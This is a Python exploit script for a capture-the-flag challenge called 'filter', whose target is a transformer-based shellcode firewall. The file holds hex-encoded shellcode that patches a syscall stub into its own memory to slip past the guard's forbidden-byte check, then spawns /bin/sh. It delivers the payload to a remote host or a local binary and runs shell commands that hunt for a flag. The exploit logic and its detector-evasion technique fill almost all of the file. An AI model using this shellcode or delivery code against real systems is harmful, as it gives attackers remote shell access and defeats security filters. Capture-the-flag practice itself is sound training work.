#!/usr/bin/env python3
"""
solve.py -- exploit for the "filter" pwn challenge (neural shellcode firewall).

The guard is a byte-level transformer that only fires on the bigrams
0f 05 / cd 80 / 0f 34.  The payload below never contains them: it patches a
"syscall; ret" stub into its own RWX page and calls it, so the guard scores
the blob -10.000 ("benign") and executes it.  Stage 2 is an execve("/bin/sh")
with an open/read/write fallback.

Usage:
    # against a live service
    ./solve.py remote HOST PORT

    # against the handout binary (auto-extracted from filter.tar.tar)
    ./solve.py local [PATH_TO_BINARY]

    # one-off command instead of the default flag hunt
    ./solve.py remote HOST PORT --cmd 'id; ls -la /'
"""

import argparse
import os
import re
import shutil
import socket
import struct
import subprocess
import sys
import tarfile
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
PAYLOAD_BIN = os.path.join(HERE, "payload.bin")

# Fallback in case payload.bin was not built (it is identical to build.sh output).
PAYLOAD_HEX = (
    "488d1d65000000c6030fc6430105c64302c331c05048b82f62696e2f736800504889e7"
    "31f631d231c0b03bffd36a7448b82f666c61672e7478504889e731f631d231c0b002ff"
    "d389c74881ec000200004889e631d2b60131c0ffd389c2bf010000004889e631c0b001"
    "ffd3c3909090"
)

DEFAULT_CMDS = [
    "echo __PWNED__; id; pwd",
    "cat /flag* /flag.txt /home/*/flag* /app/flag* /srv/flag* 2>/dev/null",
    "find / -maxdepth 3 -iname '*flag*' 2>/dev/null | head",
    "ls -la / /home /app /srv 2>/dev/null",
]


def payload() -> bytes:
    if os.path.exists(PAYLOAD_BIN):
        return open(PAYLOAD_BIN, "rb").read()
    return bytes.fromhex(PAYLOAD_HEX)


def check_payload(sc: bytes) -> None:
    for bad in (b"\x0f\x05", b"\xcd\x80", b"\x0f\x34"):
        assert bad not in sc, "payload contains forbidden bigram %r" % bad


def recv_all(sock, timeout=1.0, limit=1 << 20) -> bytes:
    sock.settimeout(timeout)
    out = b""
    while len(out) < limit:
        try:
            chunk = sock.recv(4096)
        except (socket.timeout, TimeoutError):
            break
        except OSError:
            break
        if not chunk:
            break
        out += chunk
    return out


def hunt_flag(text: str):
    m = re.search(r"ctfcup\{[^}\r\n]*\}", text)
    return m.group(0) if m else None


def run_remote(host: str, port: int, cmds, timeout=10.0) -> str:
    sc = payload()
    check_payload(sc)

    s = socket.create_connection((host, port), timeout=timeout)
    banner = recv_all(s, 2.0)
    sys.stderr.write(banner.decode("latin1", "replace"))

    s.sendall(struct.pack("<I", len(sc)) + sc)
    log = banner.decode("latin1", "replace")
    time.sleep(0.5)
    out = recv_all(s, 3.0)
    log += out.decode("latin1", "replace")
    sys.stderr.write(out.decode("latin1", "replace"))

    if b"Executing" in out or b"Executing" in banner:
        for c in cmds:
            try:
                s.sendall(c.encode() + b"\n")
            except OSError:
                break
            time.sleep(0.35)
            chunk = recv_all(s, 1.2)
            log += chunk.decode("latin1", "replace")
            sys.stderr.write(chunk.decode("latin1", "replace"))
        try:
            s.sendall(b"exit\n")
        except OSError:
            pass
    s.close()
    return log


def local_binary(path=None) -> str:
    if path:
        return path
    tar = os.path.join(os.path.dirname(HERE), "filter.tar.tar")
    if not os.path.exists(tar):
        sys.exit("no binary given and filter.tar.tar not found")
    tmp = tempfile.mkdtemp(prefix="filter-")
    with tarfile.open(tar) as tf:
        tf.extractall(tmp)
    return os.path.join(tmp, "filter", "filter")


def run_local(path, cmds) -> str:
    sc = payload()
    check_payload(sc)
    p = subprocess.Popen(
        [path],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    p.stdin.write(struct.pack("<I", len(sc)) + sc)
    p.stdin.flush()
    time.sleep(0.4)
    for c in cmds:
        p.stdin.write(c.encode() + b"\n")
        p.stdin.flush()
        time.sleep(0.2)
    p.stdin.write(b"exit\n")
    p.stdin.flush()
    try:
        out, _ = p.communicate(timeout=5)
    except subprocess.TimeoutExpired:
        p.kill()
        out = p.stdout.read()
    text = out.decode("latin1", "replace")
    sys.stderr.write(text)
    return text


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("mode", choices=["remote", "local"])
    ap.add_argument("args", nargs="*")
    ap.add_argument("--cmd", action="append", help="command(s) to run (repeatable)")
    a = ap.parse_args()

    cmds = a.cmd if a.cmd else DEFAULT_CMDS

    if a.mode == "remote":
        if len(a.args) < 2:
            ap.error("remote needs HOST PORT")
        log = run_remote(a.args[0], int(a.args[1]), cmds)
    else:
        log = run_local(local_binary(a.args[0] if a.args else None), cmds)

    flag = hunt_flag(log)
    print()
    if flag:
        print("[+] FLAG: %s" % flag)
        return 0
    print("[-] no ctfcup{...} in the transcript")
    return 1


if __name__ == "__main__":
    sys.exit(main())
